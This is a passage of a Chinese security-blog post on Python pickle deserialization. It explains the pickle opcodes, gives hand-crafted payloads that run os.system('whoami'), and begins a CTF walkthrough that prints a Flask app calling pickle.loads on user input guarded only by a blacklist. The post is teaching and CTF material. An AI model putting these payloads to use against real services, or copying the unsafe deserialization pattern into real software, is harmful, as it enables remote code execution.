@@ -1,0 +1,509 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pickle反序列化 | ivory's blog</title><meta name="author" content="ivory"><meta name="copyright" content="ivory"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Picklehttps:&#x2F;&#x2F;goodapple.top&#x2F;archives&#x2F;1069pickle反序列化比java和php的危害要大不少因为利用起来比较容易，很轻松可以RCE经常和其它基础漏洞配合起来使用 能够序列化的对象 None bool int,float,complex 元素全部为可打包对象的tuple、list、set 和 dict 函数 使用def定义的模块顶层的函数(lambda不行)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pickle反序列化">
+<meta property="og:url" content="http://ireel.github.io/2025/12/29/pickle-unserialize/index.html">
+<meta property="og:site_name" content="ivory&#39;s blog">
+<meta property="og:description" content="Picklehttps:&#x2F;&#x2F;goodapple.top&#x2F;archives&#x2F;1069pickle反序列化比java和php的危害要大不少因为利用起来比较容易，很轻松可以RCE经常和其它基础漏洞配合起来使用 能够序列化的对象 None bool int,float,complex 元素全部为可打包对象的tuple、list、set 和 dict 函数 使用def定义的模块顶层的函数(lambda不行)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://ireel.github.io/img/logo/Python.png">
+<meta property="article:published_time" content="2025-12-29T08:45:06.000Z">
+<meta property="article:modified_time" content="2025-12-29T08:52:43.002Z">
+<meta property="article:author" content="ivory">
+<meta property="article:tag" content="python">
+<meta property="article:tag" content="pickle">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://ireel.github.io/img/logo/Python.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "pickle反序列化",
+  "url": "http://ireel.github.io/2025/12/29/pickle-unserialize/",
+  "image": "http://ireel.github.io/img/logo/Python.png",
+  "datePublished": "2025-12-29T08:45:06.000Z",
+  "dateModified": "2025-12-29T08:52:43.002Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "ivory",
+      "url": "http://ireel.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/head.jpg"><link rel="canonical" href="http://ireel.github.io/2025/12/29/pickle-unserialize/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'pickle反序列化',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/font.css"><link rel="stylesheet" href="/css/custom.css"><script src="/js/custom.js"></script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/Commedia/videoframe_68476.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/novel/"><i class="fa-fw fas fa-book"></i><span> 随笔</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/logo/Python.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">ivory's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">pickle反序列化</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/novel/"><i class="fa-fw fas fa-book"></i><span> 随笔</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">pickle反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-29T08:45:06.000Z" title="发表于 2025-12-29 16:45:06">2025-12-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-29T08:52:43.002Z" title="更新于 2025-12-29 16:52:43">2025-12-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%9F%A5%E8%AF%86/">知识</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Pickle"><a href="#Pickle" class="headerlink" title="Pickle"></a>Pickle</h1><p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a><br>pickle反序列化比java和php的危害要大不少<br>因为利用起来比较容易，很轻松可以RCE<br>经常和其它基础漏洞配合起来使用</p>
+<h3 id="能够序列化的对象"><a href="#能够序列化的对象" class="headerlink" title="能够序列化的对象"></a>能够序列化的对象</h3><ul>
+<li>None</li>
+<li>bool</li>
+<li>int,float,complex</li>
+<li>元素全部为可打包对象的tuple、list、set 和 dict</li>
+<li>函数<ul>
+<li>使用def定义的模块顶层的函数(lambda不行)</li>
+<li>内置函数</li>
+</ul>
+</li>
+<li>类<ul>
+<li>使用class定义在模块顶层的</li>
+</ul>
+</li>
+<li>实例对象<ul>
+<li><code>__dict__</code>属性和<code>__getstate__()</code>函数的返回值为可序列化对象</li>
+</ul>
+</li>
+</ul>
+<p>PS:对于不能序列化的数据会抛出<code>PicklingError</code>异常</p>
+<h3 id="opcode和Bytecode"><a href="#opcode和Bytecode" class="headerlink" title="opcode和Bytecode"></a>opcode和Bytecode</h3><p>pickle的序列化数据的一种格式是opcode（直译就是操作码）</p>
+<p>是一种独立的栈语言，</p>
+<p>Python Bytecode (<code>.pyc</code>): 是给 PVM (Python Virtual Machine) 看的，用于通用的程序逻辑</p>
+<p>例如：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br></pre></td></tr></table></figure>
+
+<p>转换成指令流：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span>           <span class="number">0</span> LOAD_FAST                <span class="number">0</span> (a)</span><br><span class="line">            <span class="number">2</span> LOAD_FAST                <span class="number">1</span> (b)</span><br><span class="line">            <span class="number">4</span> BINARY_ADD</span><br><span class="line">            <span class="number">6</span> RETURN_VALUE</span><br></pre></td></tr></table></figure>
+
+<p>这整个指令流被称为Bytecode（但实际上更普遍的被称为opcode）</p>
+<p>而类似<code>LOAD_FAST</code>的单个指令就是一个普遍的opcode</p>
+<h3 id="pickle-opcode"><a href="#pickle-opcode" class="headerlink" title="pickle opcode"></a>pickle opcode</h3><p>Pickle Opcode: 是给 Unpickler (Pickle 虚拟机) 看的，专门用于构建对象</p>
+<p>刚刚介绍的正常opcode包含很多复杂的指令逻辑例如做加法 (<code>BINARY_ADD</code>)、比较大小 (<code>COMPARE_OP</code>)、循环 (<code>JUMP_ABSOLUTE</code>)。</p>
+<p>但pickle的opcode只支持存储与堆叠，旨在恢复数据</p>
+<p>以下是大部分常见pickle opcode</p>
+<table>
+<thead>
+<tr>
+<th align="left">Opcode (Char&#x2F;Hex)</th>
+<th align="left">Name</th>
+<th align="left">Description (功能描述)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>基础控制与数值</strong></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><code>.</code> (<code>0x2e</code>)</td>
+<td align="left"><code>STOP</code></td>
+<td align="left">结束 Pickle 流，反序列化完成</td>
+</tr>
+<tr>
+<td align="left"><code>N</code> (<code>0x4e</code>)</td>
+<td align="left"><code>NONE</code></td>
+<td align="left">推送 <code>None</code> 到栈顶</td>
+</tr>
+<tr>
+<td align="left"><code>I</code> (<code>0x49</code>)</td>
+<td align="left"><code>INT</code></td>
+<td align="left">推送整数 (文本格式)</td>
+</tr>
+<tr>
+<td align="left"><code>F</code> (<code>0x46</code>)</td>
+<td align="left"><code>FLOAT</code></td>
+<td align="left">推送浮点数 (文本格式)</td>
+</tr>
+<tr>
+<td align="left"><code>S</code> (<code>0x53</code>)</td>
+<td align="left"><code>STRING</code></td>
+<td align="left">推送字符串 (带引号的文本格式)</td>
+</tr>
+<tr>
+<td align="left"><code>V</code> (<code>0x56</code>)</td>
+<td align="left"><code>UNICODE</code></td>
+<td align="left">推送 Unicode 字符串</td>
+</tr>
+<tr>
+<td align="left"><code>K</code> (<code>0x4b</code>)</td>
+<td align="left"><code>BININT1</code></td>
+<td align="left">推送 1 字节无符号整数</td>
+</tr>
+<tr>
+<td align="left"><code>M</code> (<code>0x4d</code>)</td>
+<td align="left"><code>BININT2</code></td>
+<td align="left">推送 2 字节无符号整数</td>
+</tr>
+<tr>
+<td align="left"><code>J</code> (<code>0x4a</code>)</td>
+<td align="left"><code>BININT</code></td>
+<td align="left">推送 4 字节有符号整数</td>
+</tr>
+<tr>
+<td align="left"><strong>容器构建 (List&#x2F;Dict&#x2F;Tuple)</strong></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><code>(</code> (<code>0x28</code>)</td>
+<td align="left"><code>MARK</code></td>
+<td align="left">推送标记 (Mark) 到栈顶，用于界定容器边界</td>
+</tr>
+<tr>
+<td align="left"><code>l</code> (<code>0x6c</code>)</td>
+<td align="left"><code>LIST</code></td>
+<td align="left">构建列表 (从栈顶直到 Mark)</td>
+</tr>
+<tr>
+<td align="left"><code>d</code> (<code>0x64</code>)</td>
+<td align="left"><code>DICT</code></td>
+<td align="left">构建字典 (从栈顶直到 Mark)</td>
+</tr>
+<tr>
+<td align="left"><code>t</code> (<code>0x74</code>)</td>
+<td align="left"><code>TUPLE</code></td>
+<td align="left">构建元组 (从栈顶直到 Mark)</td>
+</tr>
+<tr>
+<td align="left"><code>]</code> (<code>0x5d</code>)</td>
+<td align="left"><code>EMPTY_LIST</code></td>
+<td align="left">推送一个空列表</td>
+</tr>
+<tr>
+<td align="left"><code>&#125;</code> (<code>0x7d</code>)</td>
+<td align="left"><code>EMPTY_DICT</code></td>
+<td align="left">推送一个空字典</td>
+</tr>
+<tr>
+<td align="left"><code>a</code> (<code>0x61</code>)</td>
+<td align="left"><code>APPEND</code></td>
+<td align="left">将栈顶元素 append 到栈顶下方的列表中</td>
+</tr>
+<tr>
+<td align="left"><code>e</code> (<code>0x65</code>)</td>
+<td align="left"><code>APPENDS</code></td>
+<td align="left">批量 append (从 Mark 开始) 到列表</td>
+</tr>
+<tr>
+<td align="left"><code>s</code> (<code>0x73</code>)</td>
+<td align="left"><code>SETITEM</code></td>
+<td align="left">设置字典键值对 (key, value)</td>
+</tr>
+<tr>
+<td align="left"><code>u</code> (<code>0x75</code>)</td>
+<td align="left"><code>SETITEMS</code></td>
+<td align="left">批量设置字典键值对 (从 Mark 开始)</td>
+</tr>
+<tr>
+<td align="left"><strong>对象与类</strong></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><code>c</code> (<code>0x63</code>)</td>
+<td align="left"><code>GLOBAL</code></td>
+<td align="left">导入模块和类 (Module.Class) 并推送到栈</td>
+</tr>
+<tr>
+<td align="left"><code>R</code> (<code>0x52</code>)</td>
+<td align="left"><code>REDUCE</code></td>
+<td align="left">调用可调用对象 (通常用于通过类和参数重建对象)</td>
+</tr>
+<tr>
+<td align="left"><code>b</code> (<code>0x62</code>)</td>
+<td align="left"><code>BUILD</code></td>
+<td align="left">调用 <code>__setstate__</code> 或更新 <code>__dict__</code> 来恢复对象状态</td>
+</tr>
+<tr>
+<td align="left"><code>o</code> (<code>0x6f</code>)</td>
+<td align="left"><code>OBJ</code></td>
+<td align="left">构建类实例 (旧协议，基于栈上的类和参数)</td>
+</tr>
+<tr>
+<td align="left"><code>i</code> (<code>0x69</code>)</td>
+<td align="left"><code>INST</code></td>
+<td align="left">实例化对象 (相当于 GLOBAL + MARK + BUILD 的旧版组合)</td>
+</tr>
+<tr>
+<td align="left"><code>\x81</code> (<code>0x81</code>)</td>
+<td align="left"><code>NEWOBJ</code></td>
+<td align="left">(Proto 2+) 直接创建新对象实例 (不调 <code>__init__</code>)</td>
+</tr>
+<tr>
+<td align="left"><strong>Memoization (记忆&#x2F;引用)</strong></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><code>p</code> (<code>0x70</code>)</td>
+<td align="left"><code>PUT</code></td>
+<td align="left">将栈顶对象存入 memo (文本索引)</td>
+</tr>
+<tr>
+<td align="left"><code>q</code> (<code>0x71</code>)</td>
+<td align="left"><code>BINPUT</code></td>
+<td align="left">将栈顶对象存入 memo (1字节二进制索引)</td>
+</tr>
+<tr>
+<td align="left"><code>r</code> (<code>0x72</code>)</td>
+<td align="left"><code>LONG_BINPUT</code></td>
+<td align="left">将栈顶对象存入 memo (4字节二进制索引)</td>
+</tr>
+<tr>
+<td align="left"><code>g</code> (<code>0x67</code>)</td>
+<td align="left"><code>GET</code></td>
+<td align="left">从 memo 获取对象 (文本索引)</td>
+</tr>
+<tr>
+<td align="left"><code>h</code> (<code>0x68</code>)</td>
+<td align="left"><code>BINGET</code></td>
+<td align="left">从 memo 获取对象 (1字节二进制索引)</td>
+</tr>
+<tr>
+<td align="left"><strong>栈操作</strong></td>
+<td align="left"></td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><code>0</code> (<code>0x30</code>)</td>
+<td align="left"><code>POP</code></td>
+<td align="left">弹出栈顶元素</td>
+</tr>
+<tr>
+<td align="left"><code>2</code> (<code>0x32</code>)</td>
+<td align="left"><code>DUP</code></td>
+<td align="left">复制栈顶元素</td>
+</tr>
+</tbody></table>
+<p>这里用一个简单的最常规的命令执行来举例：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">cos</span><br><span class="line">system   <span class="comment">#字节码为c，形式为c[moudle]\n[instance]\n，导入os.system。并将函数压入stack</span></span><br><span class="line"> </span><br><span class="line">(S<span class="string">&#x27;ls&#x27;</span>   <span class="comment">#字节码为(，向stack中压入一个MARK。字节码为S，示例化一个字符串对象&#x27;whoami&#x27;并将其压入stack</span></span><br><span class="line"> </span><br><span class="line">tR.      <span class="comment">#字节码为t，寻找栈中MARK，并组合之间的数据为元组。然后通过字节码R执行os.system(&#x27;whoami&#x27;)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#字节码为.，程序结束，将栈顶元素os.system(&#x27;ls&#x27;)作为返回值</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的栈是pickle模块内部的一个列表</p>
+<p>“压入栈”实际就是append进列表</p>
+<p>过程模拟：</p>
+<p>第一步</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">|               |</span><br><span class="line">| os.system     | &lt;--- 栈顶</span><br><span class="line">|_______________|</span><br></pre></td></tr></table></figure>
+
+<p>第二步</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">| (MARK)        | &lt;--- 栈顶</span><br><span class="line">| os.system     |</span><br><span class="line">|_______________|</span><br></pre></td></tr></table></figure>
+
+<p>第三步</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">| <span class="string">&#x27;whoami&#x27;</span>      | &lt;--- 栈顶</span><br><span class="line">| (MARK)        |</span><br><span class="line">| os.system     |</span><br><span class="line">|_______________|</span><br></pre></td></tr></table></figure>
+
+<p>第四步<code>t</code>构建元组</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">| (<span class="string">&#x27;whoami&#x27;</span>,)   | &lt;--- 栈顶 (这是一个元组，作为参数列表)</span><br><span class="line">| os.system     | &lt;--- 这里的 os.system 一直没动</span><br><span class="line">|_______________|</span><br></pre></td></tr></table></figure>
+
+<p>第五步R执行函数，要求栈顶为参数元组，栈顶的下面一个元素为可执行函数</p>
+<p>第六步<code>.</code>停止</p>
+<p>那么了解这个过程后拓展其余的执行函数的过程就很清晰了</p>
+<hr>
+<p>字节码<code>o</code>:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode3=<span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>以上一个mark上的第一个数据（必须是可执行函数）为函数</p>
+<p>以第2~n个数据为函数参数执行</p>
+<hr>
+<p>字节码<code>i</code>:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode2=<span class="string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>用类似c的方式获取到一个可执行函数，然后寻找上一个mark，以mark和自身之间的入栈数据作为元组，以元组作为参数执行</p>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h5 id="2024极客大挑战-ez-python"><a href="#2024极客大挑战-ez-python" class="headerlink" title="2024极客大挑战-ez_python"></a>2024极客大挑战-ez_python</h5><p>常规注册登录，暂时没有发现可攻击的点<br>但登录后提示查看:<code>/starven_s3cret</code><br>成功获得源码:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, make_response, render_template, send_file</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> black</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#To Ctfer：给你源码只是给你漏洞点的hint，怎么绕？black.py黑盒，唉无意义</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="built_in">open</span>(<span class="string">&#x27;templates/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        usname = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        passwd = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> usname <span class="keyword">and</span> passwd:</span><br><span class="line">            heart_cookie = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line">            response = make_response(<span class="string">f&quot;Registered successfully with username: <span class="subst">&#123;usname&#125;</span> &lt;br&gt; Now you can go to /login to heal starven&#x27;s heart&quot;</span>)</span><br><span class="line">            response.set_cookie(<span class="string">&#x27;heart&#x27;</span>, heart_cookie)</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>  render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    heart_cookie = request.cookies.get(<span class="string">&#x27;heart&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> heart_cookie:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;warning.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> request.cookies.get(<span class="string">&#x27;heart&#x27;</span>) == heart_cookie:</span><br><span class="line">        statement = request.form[<span class="string">&#x27;statement&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            heal_state = base64.b64decode(statement)</span><br><span class="line">            <span class="built_in">print</span>(heal_state)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> black.blacklist:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">in</span> heal_state:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;waf.html&#x27;</span>)</span><br><span class="line">            pickle.loads(heal_state)</span><br><span class="line">            res = make_response(<span class="string">f&quot;Congratulations! You accomplished the first step of healing Starven&#x27;s broken heart!&quot;</span>)</span><br><span class="line">            flag = os.getenv(<span class="string">&quot;GEEK_FLAG&quot;</span>) <span class="keyword">or</span> os.system(<span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line">            os.system(<span class="string">&quot;echo &quot;</span> + flag + <span class="string">&quot; &gt; /flag&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>( e)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error!!!! give you hint: maybe you can view /starven_s3cret&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/monologue&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">joker</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;joker.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/starven_s3cret&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(__file__,as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span 